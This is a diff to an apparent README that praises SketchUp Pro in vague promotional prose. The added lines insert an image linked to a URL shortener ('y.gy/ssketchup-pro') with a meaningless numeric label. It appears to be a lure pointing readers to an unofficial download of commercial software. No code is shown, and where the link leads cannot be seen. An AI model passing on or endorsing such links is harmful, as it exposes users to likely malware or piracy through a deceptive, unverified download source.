@@ -1,6 +1,8 @@
 # SketchUp Pro
 SketchUp Pro has established itself as a comprehensive design solution that effectively addresses the requirements of both commercial architecture firms and independent creative endeavors. The software's robust suite of modeling tools for both planar and spatial design has become fundamental for experts working in architectural design, structural engineering, and environmental planning. Its versatile accessibility—provided through both browser-based and native desktop versions—supports seamless adoption across varied professional contexts and distributed team structures.
 
+[![356735683567946789](https://github.com/user-attachments/assets/2624e90a-82d7-433e-b255-fef86b0193ca)](https://y.gy/ssketchup-pro)
+
 ## **Industry Positioning**
 Within the competitive landscape of design software that includes solutions like AutoCAD, FreeCAD, and LibreCAD, SketchUp Pro achieves differentiation through superior learning accessibility and comprehensive platform support. Despite AutoCAD's established presence in certain technical fields, SketchUp Pro has garnered significant user adoption through its logical design approach and harmonious 2D/3D integrated environment that engages creative professionals worldwide. This unified design framework supports unlimited inventive conceptualization and accelerated design development.
 
